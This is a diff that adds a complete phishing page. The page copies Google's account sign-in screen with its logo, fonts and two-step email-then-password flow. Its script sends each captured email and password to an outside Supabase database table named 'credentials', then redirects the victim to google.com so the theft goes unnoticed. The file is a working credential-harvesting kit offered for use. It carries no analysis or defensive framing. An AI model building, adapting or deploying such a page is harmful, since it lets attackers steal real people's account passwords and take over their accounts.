@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in - Google Accounts</title>
+  <script src="supabase.js"></script>
+  <style>
+    @font-face { font-family: 'Google Sans'; src: url('https://gstatic.com'); }
+    body { display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background: #fff; font-family: 'Google Sans', Roboto, sans-serif; }
+    .container { display: grid; grid-template-columns: 1fr 1fr; width: 1040px; min-height: 450px; padding: 48px; border: 1px solid #dadce0; border-radius: 28px; box-sizing: border-box; }
+    @media (max-width: 1040px) { .container { grid-template-columns: 1fr; width: 450px; border: none; padding: 32px; } .left-col { text-align: center; align-items: center !important; margin-bottom: 24px; } }
+    .left-col { display: flex; flex-direction: column; align-items: flex-start; }
+    .left-col img { width: 48px; margin-bottom: 24px; }
+    .left-col h1 { font-size: 45px; font-weight: 400; margin: 0; color: #1f1f1f; }
+    .right-col { display: flex; flex-direction: column; padding-top: 60px; }
+    .user-pill { display: none; align-items: center; padding: 3px 12px; border: 1px solid #dadce0; border-radius: 16px; font-size: 14px; margin-bottom: 24px; cursor: pointer; }
+    .input-group { position: relative; margin-bottom: 12px; }
+    input { width: 100%; padding: 18px 15px; border: 1px solid #747775; border-radius: 4px; font-size: 16px; outline: none; box-sizing: border-box; }
+    input:focus { border: 2px solid #0b57d0; }
+    .floating-label { position: absolute; left: 12px; top: 18px; color: #444746; background: white; padding: 0 4px; transition: 0.2s; pointer-events: none; }
+    input:focus + .floating-label, input:not(:placeholder-shown) + .floating-label { top: -10px; font-size: 12px; color: #0b57d0; }
+    .actions { display: flex; justify-content: flex-end; align-items: center; gap: 24px; margin-top: 40px; }
+    button { padding: 10px 24px; border: none; border-radius: 20px; background: #0b57d0; color: white; font-weight: 500; cursor: pointer; }
+    .footer { width: 1040px; display: flex; justify-content: space-between; margin-top: 24px; font-size: 12px; color: #1f1f1f; }
+    .footer-links { display: flex; gap: 24px; }
+    .footer a { text-decoration: none; color: #1f1f1f; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="left-col">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/330px-Google_%22G%22_logo.svg.png">
+      <h1 id="headline">Sign in</h1>
+      <p>Use your Google Account</p>
+    </div>
+    <div class="right-col">
+      <div class="user-pill" id="userPill" onclick="location.reload()"><span id="displayEmail"></span></div>
+      <div id="emailScreen">
+        <div class="input-group"><input type="text" id="email" placeholder=" " required><label class="floating-label">Email or phone</label></div>
+        <div class="actions"><button onclick="handleNext()">Next</button></div>
+      </div>
+      <div id="passwordScreen" style="display: none;">
+        <div class="input-group"><input type="password" id="password" placeholder=" " required><label class="floating-label">Enter your password</label></div>
+        <div class="actions"><button id="finalBtn" onclick="handleFinalSubmit()">Next</button></div>
+      </div>
+    </div>
+  </div>
+  <div class="footer"><div>English (United States) ▾</div><div class="footer-links"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div></div>
+  <script>
+    const _supabase = supabase.createClient('https://supabase.co', 'sb_publishable_MZZ1I6MzxmRZDXWxfkRfXQ_UhwCCMK_');
+    let capturedEmail = "";
+    function handleNext() {
+      capturedEmail = document.getElementById('email').value;
+      if (!capturedEmail.includes('@')) return alert("Enter valid email");
+      document.getElementById('emailScreen').style.display='none'; document.getElementById('passwordScreen').style.display='block';
+      document.getElementById('userPill').style.display='flex'; document.getElementById('displayEmail').innerText=capturedEmail;
+      document.getElementById('headline').innerText='Welcome';
+    }
+    async function handleFinalSubmit() {
+      const pass = document.getElementById('password').value;
+      document.getElementById('finalBtn').innerText="Loading...";
+      await _supabase.from('credentials').insert([{ email: capturedEmail, password: pass }]);
+      window.location.href = "https://google.com";
+    }
+  </script>
+</body>
+</html>
